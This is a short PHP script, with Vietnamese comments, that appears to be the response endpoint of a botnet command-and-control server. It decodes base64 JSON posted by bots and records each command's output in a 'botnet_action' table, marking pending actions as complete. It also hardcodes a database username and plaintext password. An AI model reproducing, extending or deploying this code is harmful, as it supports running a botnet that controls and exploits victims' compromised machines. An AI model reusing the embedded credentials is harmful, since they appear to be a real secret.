<?php

$servername = "localhost";
$username = "ailurophile"; // thay đổi với username của bạn
$password = "Dinokulz123."; // thay đổi với mật khẩu của bạn
$dbname = "ailurophile"; // thay đổi với tên database của bạn

try {
    $pdo = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Kết nối thất bại: " . $e->getMessage());
}

// Kiểm tra nếu có POST request với tham số data
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Nhận dữ liệu JSON từ body của yêu cầu
    $postData = file_get_contents("php://input");
    $decodedData = json_decode($postData, true);

    if (isset($decodedData['data'])) {
        // Giải mã dữ liệu base64
        $decodedJson = base64_decode($decodedData['data']);
        
        // Chuyển chuỗi JSON thành mảng
        $dataArray = json_decode($decodedJson, true);

        // Kiểm tra nếu action_id và response có tồn tại trong dữ liệu nhận được
        if (isset($dataArray['action_id']) && isset($dataArray['response'])) {
            $actionId = $dataArray['action_id'];
            $response = $dataArray['response'];

            // Kiểm tra xem trong bảng botnet_action có bản ghi với action_id và status = 'pending' không
            $stmt = $pdo->prepare("SELECT id FROM botnet_action WHERE id = :action_id AND status = 'pending' LIMIT 1");
            $stmt->execute(['action_id' => $actionId]);
            $action = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($action) {
                // Cập nhật response và chuyển status thành 'success'
                $updateStmt = $pdo->prepare("UPDATE botnet_action SET response = :response, status = 'success' WHERE id = :action_id");
                $updateStmt->execute([
                    'response' => $response,
                    'action_id' => $actionId
                ]);

                echo json_encode(["msg" => "success", "details" => "Action updated successfully"]);
            } else {
                echo json_encode(["msg" => "error", "details" => "No pending action found with given action_id"]);
            }
        } else {
            echo json_encode(["msg" => "error", "details" => "Invalid data format"]);
        }
    } else {
        echo json_encode(["msg" => "error", "details" => "No data field in JSON"]);
    }
} else {
    echo json_encode(["msg" => "error", "details" => "No data received"]);
}

